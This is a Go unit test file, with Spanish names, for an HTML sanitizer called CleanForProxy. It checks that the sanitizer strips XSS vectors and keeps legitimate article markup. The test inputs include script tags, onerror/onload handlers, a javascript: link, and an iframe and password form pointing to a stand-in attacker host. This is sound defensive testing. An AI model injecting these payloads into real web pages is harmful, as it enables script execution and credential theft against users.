package sanitizer

import (
	"strings"
	"testing"
)

func TestCleanForProxy(t *testing.T) {
	casos := []struct {
		nombre  string
		entrada string
		prohib  string
	}{
		{"script con type previo (el bug del atributo duplicado)",
			`<script type="module">alert(1)</script>`, "alert(1)"},
		{"script normal", `<script>alert(1)</script>`, "alert(1)"},
		{"event handler onerror", `<img src=x onerror=alert(1)>`, "onerror"},
		{"event handler onload en body", `<body onload=alert(1)>hi</body>`, "onload"},
		{"iframe", `<iframe src="https://atacante.tld/x"></iframe>`, "atacante.tld"},
		{"href javascript", `<a href="javascript:alert(1)">x</a>`, "javascript:"},
		{"svg onload", `<svg onload=alert(1)></svg>`, "onload"},
		{"form e input", `<form action="https://atacante.tld"><input name=pw></form>`, "atacante.tld"},
	}
	for _, c := range casos {
		t.Run(c.nombre, func(t *testing.T) {
			got := CleanForProxy(c.entrada)
			if strings.Contains(got, c.prohib) {
				t.Errorf("CleanForProxy dejó pasar %q\n  entrada: %s\n  salida : %s", c.prohib, c.entrada, got)
			}
		})
	}
}

func TestCleanForProxyConservaEstructuraDeArticulo(t *testing.T) {
	entrada := `<article><figure><img src="https://ejemplo.tld/a.png"><figcaption>pie</figcaption></figure>` +
		`<section><h2>Título</h2><p>Texto con <a href="/rel">un enlace</a>.</p></section></article>`
	got := CleanForProxy(entrada)
	for _, debe := range []string{"<article>", "<figure>", "<figcaption>", "<h2>", "<p>", "ejemplo.tld/a.png"} {
		if !strings.Contains(got, debe) {
			t.Errorf("CleanForProxy eliminó %q, que es estructura legítima de artículo.\n  salida: %s", debe, got)
		}
	}
}
